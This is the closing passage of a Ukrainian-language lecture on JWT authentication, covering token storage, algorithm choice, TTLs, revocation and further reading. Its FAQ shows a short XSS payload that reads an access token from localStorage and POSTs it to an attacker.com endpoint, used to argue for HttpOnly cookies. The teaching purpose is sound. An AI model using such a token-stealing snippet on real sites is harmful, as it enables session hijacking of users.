::accordion-item{label="❓ Чи безпечно зберігати токени у localStorage?" icon="i-lucide-help-circle"}

**Категорично ні** для критичних застосунків. localStorage доступне для будь-якого JavaScript коду на сторінці через `localStorage.getItem('token')`. Успішна XSS атака (впровадження шкідливого скрипту через незахищене поле вводу або компрометовану сторонню бібліотеку) дозволяє зловмиснику викрасти токен:

```javascript
// Шкідливий скрипт, впроваджений через XSS
const stolenToken = localStorage.getItem('accessToken');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token: stolenToken }),
});
```

**Альтернативи:**

1. **HttpOnly Cookies:** токен недоступний для JavaScript, передається автоматично браузером.
2. **In-Memory зберігання:** токен зберігається у змінній JavaScript (втрачається при оновленні сторінки, але безпечніший за localStorage).
3. **Service Workers:** токен зберігається у відокремленому контексті, недоступному для головного потоку.

Для продакшену рекомендується **HttpOnly Cookies для refresh token** та **in-memory зберігання для access token** з автоматичним оновленням через refresh endpoint.

::

::

---

## Ключові висновки

::card-group

::card{title="📦 Структура трьох частин" icon="i-lucide-layers"}

JWT складається з Header (метадані та алгоритм), Payload (claims про користувача) та Signature (криптографічний підпис). Кожна частина кодується у Base64URL та розділяється крапками. Токени є **підписаними, але не зашифрованими** — payload читабельний для всіх.

::

::card{title="🔐 Вибір алгоритму" icon="i-lucide-key"}

**HS256** (HMAC) — простота та швидкість для монолітних застосунків. **RS256** (RSA) — стандарт для мікросервісів та OAuth 2.0, дозволяє делеговану верифікацію через публічний ключ. **ES256** (ECDSA) — баланс між швидкістю та безпекою для high-performance систем.

::

::card{title="⏰ Короткий TTL та Refresh Tokens" icon="i-lucide-clock"}

Access токени мають бути короткоживучими (5–15 хвилин) для обмеження вікна вразливості при компрометації. Refresh токени з довгим TTL (7–30 днів) дозволяють автоматично оновлювати access токени без повторного входу користувача.

::

::card{title="🚫 Проблема відкликання" icon="i-lucide-alert-triangle"}

Stateless природа JWT унеможливлює миттєве відкликання токенів без додаткових механізмів. Рішення: blacklist у Redis (втрата stateless переваг), refresh token rotation (баланс) або real-time push invalidation (складність).

::

::

---

## Рекомендовані ресурси для поглибленого вивчення

- **RFC 7519 — JSON Web Token (JWT):** офіційна специфікація стандарту з детальним описом структури, claims та процесу верифікації.

- **JWT.io:** інтерактивний інструмент для декодування, верифікації та генерації JWT токенів з підтримкою різних алгоритмів підпису.

- **OWASP JWT Security Cheat Sheet:** найкращі практики безпеки JWT від Open Web Application Security Project, включно з захистом від типових атак.

- **RFC 7517 — JSON Web Key (JWK):** стандарт для представлення криптографічних ключів у JSON форматі, використовується для публікації публічних ключів через JWKS endpoints.

- **Auth0 JWT Handbook:** вичерпний посібник з теорії та практики використання JWT у сучасних застосунках.

::note
У наступній лекції ми детально розглянемо **практичну інтеграцію JWT у NestJS** через модуль `@nestjs/jwt` — генерацію токенів при логіні, створення JwtAuthGuard для захисту маршрутів, витягування даних користувача з токена через декоратори та налаштування глобальної автентифікації. Ви реалізуєте повноцінну систему token-based автентифікації від початку до кінця.
::
